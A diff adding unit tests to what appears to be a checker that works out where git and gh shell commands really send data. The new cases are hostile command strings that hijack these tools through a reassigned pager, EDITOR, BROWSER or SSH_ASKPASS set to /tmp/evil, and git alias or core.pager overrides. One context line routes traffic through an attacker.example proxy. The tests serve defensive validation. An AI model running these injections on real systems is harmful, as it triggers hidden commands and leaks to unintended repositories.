@@ -494,6 +494,19 @@ class Unfollowable(unittest.TestCase):
             "CDPATH=/other; cd sub && git push origin",
             "PS4='$(g\\it -C /other push origin)'; set -x; git push origin",
             "https_proxy=http://attacker.example:8080; git push origin",
+            # Main refused this; an exported pager keeps its export when it is reassigned.
+            "export GIT_PAGER=cat; GIT_PAGER='gh api -X POST repos/acme/other/issues -f title=x; cat'; "
+            "git --paginate log -1; gh pr view 1 -R acme/api",
+            "PAGER='gh api -X POST repos/acme/other/issues; cat' gh pr view 1 -R acme/api",
+            "export GH_PAGER='sh -c x'; gh pr view 1 -R acme/api",
+            "EDITOR=/tmp/evil; gh pr create -R acme/api",
+            "BROWSER=/tmp/evil; gh pr view 1 -R acme/api --web",
+            "SSH_ASKPASS=/tmp/evil; git push origin",
+            "git -calias.p='push https://github.com/acme/other.git HEAD' p",
+            "git -ccore.pager='gh api repos/acme/other; :' --paginate log",
+            "git -ccore.pager=$P --paginate log && git push origin",
+            "git --config=alias.p=push p https://github.com/acme/public.git",
+            "git --config-env core.pager=P --paginate log",
         ):
             with self.assertRaises(CONTEXT.Unfollowable, msg=command):
                 CONTEXT.call_targets(bash(command, "/w"))
@@ -543,6 +556,22 @@ class FollowedSettings(unittest.TestCase):
             "STATUS=$(git status --porcelain); git push origin",
         ):
             self.assertEqual(self.targets(command), [Target("remote", "origin", "/w")], command)
+
+    def test_an_inert_pager_or_an_attached_harmless_setting_is_followed(self):
+        for command in ("GH_PAGER=cat gh pr view 1 -R acme/api", "export PAGER=less GIT_PAGER=; gh pr view 1 -R acme/api"):
+            self.assertEqual(self.targets(command), slug("acme/api", 1), command)
+        self.assertEqual(self.targets("git -ccolor.ui=never log && git push origin"), [Target("remote", "origin", "/w")])
+
+    def test_a_redirection_and_its_descriptor_are_no_words_of_the_command(self):
+        for command in (
+            "git 2>/dev/null push https://github.com/acme/public HEAD",
+            "git push 1>&2 https://github.com/acme/public",
+            "git push &>/dev/null https://github.com/acme/public",
+            "git push >|out.txt https://github.com/acme/public",
+            "git <&3 push https://github.com/acme/public",
+        ):
+            self.assertEqual(self.targets(command), slug("acme/public"), command)
+        self.assertEqual(self.targets("git push origin 2"), [Target("remote", "origin", "/w")])
 
     def test_a_here_document_is_text_and_not_shell(self):
         command = (
